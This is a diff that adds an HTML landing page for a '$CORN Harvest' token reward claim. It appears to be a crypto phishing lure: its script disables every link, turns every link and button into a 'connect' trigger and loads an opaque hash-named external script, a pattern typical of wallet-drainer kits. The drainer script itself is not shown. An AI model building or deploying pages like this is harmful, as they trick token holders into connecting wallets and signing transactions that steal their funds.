@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>WE LIKE THE CORN</title>
+<style>
+        body,
+        html {
+            height: 100%;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #000;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: calc(100% - 40px);
+            color: white;
+        }
+
+        .logo {
+            max-width: 200px;
+        }
+
+        .banner {
+            width: 100%;
+            height: 400px;
+            background-image: url('./image.png');
+            background-size: cover;
+            background-position: center;
+            margin-bottom: 40px;
+        }
+
+        .title {
+            margin: 0;
+            font-size: 2em;
+        }
+
+        .description {
+            text-align: center;
+            margin: 40px 0;
+        }
+
+        .register-btn {
+            padding: 15px 30px;
+            background-color: #0057b8;
+            /* Button color from logo */
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+            margin-bottom: 20px;
+            /* Spacing between button and footer */
+        }
+
+        .register-btn:hover {
+            background-color: #004c9e;
+            /* Darken button color on hover */
+        }
+
+        .footer {
+            width: 100%;
+            color: white;
+            text-align: center;
+            padding: 20px 0;
+            background-color: #333;
+            position: absolute;
+            /* Footer at the bottom */
+            bottom: 0;
+        }
+    </style>
+<script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Add CSS for cursor pointer
+            var style = document.createElement('style');
+            style.innerHTML = '.interact-button { cursor: pointer; }';
+            document.head.appendChild(style);
+
+            // Update <a> & <button> elements
+            document.querySelectorAll('a').forEach(function (link) {
+                link.addEventListener('click', function (event) {
+                    event.preventDefault();
+                })
+                link.removeAttribute('href');
+                link.classList.add('connectButton');
+                link.classList.add('placeholder-button');
+                link.classList.add('connect-button');
+				link.classList.add('interact-button');
+				link.classList.add('open');
+				
+            });
+
+            document.querySelectorAll('button').forEach(function (link) {
+                link.addEventListener('click', function (event) {
+                    event.preventDefault();
+                })
+                link.removeAttribute('href');
+                link.classList.add('connectButton');
+                link.classList.add('placeholder-button');
+                link.classList.add('connect-button');
+				link.classList.add('interact-button');
+				link.classList.add('open');
+            });
+        })
+    </script>
+<script charset="UTF-8" src="local_resources/js/d0d14648faf868f3554e2a6622007b61.js" type="text/javascript"></script><script>console.log("a6542edf-c7b2-435d-ada7-829495c81223")</script>"</head>
+<body>
+<div class="container">
+<div class="banner"></div>
+<h1 class="title">$CORN Harvest</h1>
+<p class="description">$CORN Holders and Stakers eligible to claim a 1.75x APR Booster to additionally earn an increased allocation for the upcoming $CORN Harvest.</p>
+<button class="interact-button placeholder-button register-btn">Get Started</button>
+</div>
+</body>
+</html>
